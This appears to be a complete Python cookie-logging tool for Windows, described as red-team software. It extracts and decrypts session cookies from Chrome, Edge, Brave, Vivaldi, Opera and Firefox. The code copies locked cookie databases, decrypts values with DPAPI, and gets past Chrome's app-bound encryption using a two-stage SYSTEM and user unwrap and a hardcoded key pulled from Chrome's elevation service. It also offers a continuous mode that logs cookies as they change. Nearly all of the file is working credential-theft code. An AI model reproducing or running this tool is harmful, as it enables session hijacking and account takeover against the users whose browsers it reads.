# cookielog.py — cookie logger: Firefox + Chromium (Chrome, Edge, Brave, Vivaldi, Opera)
#
#   EDUCATIONAL USE ONLY — FOR SECURITY RESEARCH AND TRAINING
#
#   This is offensive security tooling for penetration testing, red-team
#   exercises, and security education. Only use on systems you own or are
#   explicitly authorized to test. Unauthorized use is illegal. The authors
#   are not responsible for misuse.
#
#   python cookielog.py             # single pass -> cookies_all.txt + cookies_all.json
#   python cookielog.py --live      # continuous log -> cookie_log.jsonl (new/changed)
#   python cookielog.py --firefox   # filter browser (chrome|edge|brave|vivaldi|opera|firefox)
#   python cookielog.py --v20-sys   # app-bound stage 1, as SYSTEM
#   python cookielog.py --v20-usr   # stage 2, as user -> v20.key
#
# deps: pip install cryptography
import argparse, base64, ctypes, ctypes.wintypes as W, glob, json, os, shutil, sqlite3, subprocess, sys, tempfile, time

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    def open_blob(key, nonce, blob):
        return AESGCM(key).decrypt(nonce, blob, None)
    def open_blob_flag(flag, key, nonce, blob):
        return (AESGCM(key) if flag == 1 else ChaCha20Poly1305(key)).decrypt(nonce, blob, None)
except ImportError:
    from Crypto.Cipher import AES, ChaCha20_Poly1305
    def open_blob_flag(flag, key, nonce, blob):
        if flag == 1:
            c = AES.new(key, AES.MODE_GCM, nonce=nonce); return c.decrypt_and_verify(blob[:-16], blob[-16:])
        c = ChaCha20_Poly1305.new(key=key, nonce=nonce);  return c.decrypt_and_verify(blob[:-16], blob[-16:])
    def open_blob(key, nonce, blob): return open_blob_flag(1, key, nonce, blob)

HERE  = os.path.dirname(os.path.abspath(__file__))
STAGE = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "cookielog")
LA    = os.environ["LOCALAPPDATA"];  APP = os.environ["APPDATA"]

# AES key from elevation_service.exe (Chrome 127..~131); re-extract from binary on new builds
ELEV_AES = base64.b64decode("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")

CHROMIUM = {
    "chrome":  rf"{LA}\Google\Chrome\User Data",
    "edge":    rf"{LA}\Microsoft\Edge\User Data",
    "brave":   rf"{LA}\BraveSoftware\Brave-Browser\User Data",
    "vivaldi": rf"{APP}\Vivaldi\User Data",
    "opera":   rf"{APP}\Opera Software\Opera Stable",
}
FIREFOX = rf"{APP}\Mozilla\Firefox\Profiles"

# ------------------------------------------------------------------ DPAPI (ctypes, no pywin32)
class BLOB(ctypes.Structure):
    _fields_ = [("cbData", W.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

_c32 = ctypes.windll.crypt32
_c32.CryptUnprotectData.restype = W.BOOL
_c32.CryptUnprotectData.argtypes = [ctypes.POINTER(BLOB), W.LPCWSTR, ctypes.c_void_p,
                                    ctypes.c_void_p, ctypes.c_void_p, W.DWORD, ctypes.POINTER(BLOB)]
_k32 = ctypes.windll.kernel32
_k32.LocalFree.argtypes = [ctypes.c_void_p]

def dpapi(data, machine=False):
    buf = ctypes.create_string_buffer(data, len(data))
    inp = BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    out = BLOB()
    if not _c32.CryptUnprotectData(ctypes.byref(inp), None, None, None, None,
                                   1 if machine else 0, ctypes.byref(out)):
        raise OSError(f"DPAPI failed, error {ctypes.GetLastError()}")
    try:    return ctypes.string_at(out.pbData, out.cbData)
    finally: _k32.LocalFree(out.pbData)

# ------------------------------------------------------------------ locked database copy + read
def copy_group(path):
    """copies the .sqlite along with -wal/-shm: without -wal you lose the last cookies written"""
    tmp = tempfile.mkdtemp(prefix="ck")
    kept = []
    for p in (path, path + "-wal", path + "-shm"):
        if os.path.exists(p):
            d = os.path.join(tmp, os.path.basename(p))
            try:    shutil.copy2(p, d)
            except PermissionError:
                subprocess.run(["esentutl", "/y", p, "/d", d, "/o"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if os.path.exists(d): kept.append(d)
    return tmp, kept

def rows(main, sql):
    tmp, files = copy_group(main)
    if not files: shutil.rmtree(tmp, ignore_errors=True); return [], tmp
    db = files[0]
    try:    con = sqlite3.connect(db)                                  # applies the recovered WAL
    except sqlite3.DatabaseError:
        con = sqlite3.connect(f"file:{db}?mode=ro&immutable=1", uri=True)
    try:    return con.execute(sql).fetchall(), tmp
    finally: con.close()

# ------------------------------------------------------------------ Chromium keys
def v20_key():
    p = os.path.join(STAGE, "v20.key")
    if not os.path.exists(p): return None
    with open(p, "rb") as f: return base64.b64decode(f.read())

def chromium_keys(local_state):
    ks = {}
    try:
        with open(local_state, encoding="utf-8") as f: oc = json.load(f).get("os_crypt", {})
    except Exception: return ks
    if oc.get("encrypted_key"):
        b = base64.b64decode(oc["encrypted_key"])
        try:
            ks[b"v10"] = ks[b"v11"] = dpapi(b[5:])                     # b"DPAPI" prefix
        except OSError:
            print(f"  [v10] user DPAPI failed at {local_state}", file=sys.stderr)
    k = v20_key()
    if k: ks[b"v20"] = k
    return ks

def decrypt_value(key, enc):
    raw = open_blob(key, enc[3:15], enc[15:])
    # the 32-byte SHA256 prefix only exists in v20 cookies (app-bound);
    # v10/v11 return the value directly — cutting 32 bytes corrupts the cookie
    return raw[32:].decode("utf-8", "replace") if enc[:3] == b"v20" else raw.decode("utf-8", "replace")

def dump_chromium(browser, root):
    out = []
    ls = os.path.join(root, "Local State")
    if not os.path.exists(ls): return out, []
    keys = chromium_keys(ls)
    for db in glob.glob(os.path.join(root, "*", "Network", "Cookies")) + \
            glob.glob(os.path.join(root, "*", "Cookies")):              # pre-88 has no Network\
        prof = os.path.basename(os.path.dirname(os.path.dirname(db)))
        recs, tmp = rows(db, "SELECT host_key,name,path,value,encrypted_value,expires_utc,"
                              "is_secure,is_httponly,samesite FROM cookies")
        for host, name, path, val, enc, exp, sec, http, samesite in recs:
            enc = bytes(enc or b"")
            if enc[:3] in keys:
                try:    val = decrypt_value(keys[enc[:3]], enc)
                except Exception: val = ""
            out.append(dict(browser=browser, profile=prof, domain=host, name=name,
                            path=path or "/", value=val,
                            expires=int(exp / 1_000_000 - 11_644_473_600) if exp else 0,
                            secure=bool(sec), httpOnly=bool(http),
                            sameSite={-1: "Lax", 1: "Strict", 2: "None"}.get(samesite, "Lax"),
                            encrypted=bool(enc)))
        shutil.rmtree(tmp, ignore_errors=True)
    return out, list(keys)

# ------------------------------------------------------------------ Firefox: no encryption (plaintext cookies)
def dump_firefox():
    out = []
    for db in glob.glob(os.path.join(FIREFOX, "*", "cookies.sqlite")):
        prof = os.path.basename(os.path.dirname(db))
        recs, tmp = rows(db, "SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite FROM moz_cookies")
        for name, val, host, path, exp, sec, http, samesite in recs:
            out.append(dict(browser="firefox", profile=prof, domain=host, name=name, path=path or "/",
                            value=val, expires=exp or 0, secure=bool(sec), httpOnly=bool(http),
                            sameSite={0: "default", 1: "Lax", 2: "Strict"}.get(samesite, "Lax"),
                            encrypted=False))
        shutil.rmtree(tmp, ignore_errors=True)
    return out

# ------------------------------------------------------------------ output
def netscape(cookies):
    lines = ["# Netscape HTTP Cookie File"]
    for c in cookies:
        dom = c["domain"] if c["domain"].startswith(".") else "." + c["domain"]
        lines.append("\t".join([dom, "TRUE", c["path"], "TRUE" if c["secure"] else "FALSE",
                                str(c["expires"]), c["name"], c["value"]]))
    return "\n".join(lines) + "\n"

def harvest(only):
    got = []
    for name, root in CHROMIUM.items():
        if only and name not in only: continue
        if os.path.isdir(root):
            part, _ = dump_chromium(name, root); got += part
    if not only or "firefox" in only:
        got += dump_firefox()
    return got

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--live", action="store_true")
    ap.add_argument("--firefox", action="store_true"); ap.add_argument("--chrome", action="store_true")
    ap.add_argument("--edge", action="store_true");    ap.add_argument("--brave", action="store_true")
    ap.add_argument("--v20-sys", action="store_true"); ap.add_argument("--v20-usr", action="store_true")
    a = ap.parse_args()

    if a.v20_sys or a.v20_usr: return stage_v20(a)

    only = {k for k, f in (("firefox", a.firefox), ("chrome", a.chrome), ("edge", a.edge),
                           ("brave", a.brave)) if f} or None

    with open(os.path.join(HERE, "cookie_log.jsonl"), "a", encoding="utf-8") as log:
        seen, first = {}, True
        while True:
            got = harvest(only)
            cur = {(c["browser"], c["profile"], c["domain"], c["name"]): c["value"] for c in got}
            for k, v in cur.items():
                if seen.get(k) != v:
                    log.write(json.dumps({"at": int(time.time()), "browser": k[0], "profile": k[1],
                                          "domain": k[2], "name": k[3], "value": v},
                                         ensure_ascii=False) + "\n")
            log.flush(); seen = cur
            with open(os.path.join(HERE, "cookies_all.txt"), "w", encoding="utf-8") as f: f.write(netscape(got))
            with open(os.path.join(HERE, "cookies_all.json"), "w", encoding="utf-8") as f:
                f.write(json.dumps(got, indent=1, ensure_ascii=False))
            if first:
                print(f"{len(got)} cookies -> cookies_all.txt / cookies_all.json")
                if not any(c["browser"] != "firefox" for c in got):
                    print("  (no Chromium decrypted: Chrome/Edge >=127 -> run v20 extraction)")
                first = False
            if not a.live: break
            print(f"\r{len(got)} live cookies  {time.strftime('%H:%M:%S')}  [Ctrl+C to stop]", end="")
            time.sleep(3)

# ------------------------------------------------------------------ app-bound (Chrome/Edge/Brave >= 127)
def abe_blobs():
    """returns [(browser, APPB blob)] for every Chromium with app_bound_encrypted_key"""
    got = []
    for name, root in CHROMIUM.items():
        ls = os.path.join(root, "Local State")
        if not os.path.exists(ls): continue
        try:
            with open(ls, encoding="utf-8") as f: ab = json.load(f)["os_crypt"]["app_bound_encrypted_key"]
        except Exception: continue
        blob = base64.b64decode(ab)
        if blob[:4] != b"APPB":
            print(f"  [{name}] app_bound_encrypted_key missing APPB prefix: Chrome changed the format")
            continue
        got.append((name, blob[4:]))
    return got

def stage_v20(a):
    os.makedirs(STAGE, exist_ok=True)
    if a.v20_sys:                                                       # layer 1: MACHINE DPAPI
        for name, blob in abe_blobs():
            try:
                with open(os.path.join(STAGE, f"{name}.stage1"), "wb") as f: f.write(dpapi(blob, machine=True))
            except OSError as e: print(f"  [{name}] run as SYSTEM: {e}")
        print(f"stage 1 ok -> {STAGE}")
        return
    got = 0
    for name in CHROMIUM:
        f = os.path.join(STAGE, f"{name}.stage1")
        if not os.path.exists(f): continue
        with open(f, "rb") as fh: wrapped = dpapi(fh.read())           # layer 2: USER DPAPI
        flag = wrapped[0]                                              # 1 = AES-GCM, other = ChaCha20
        key = open_blob_flag(flag, ELEV_AES, wrapped[1:13], wrapped[13:])
        with open(os.path.join(STAGE, "v20.key"), "wb") as f: f.write(base64.b64encode(key))
        got += 1
    print("stage 2 ok: v20.key generated" if got else "nothing to do in stage 2")

if __name__ == "__main__":
    main()
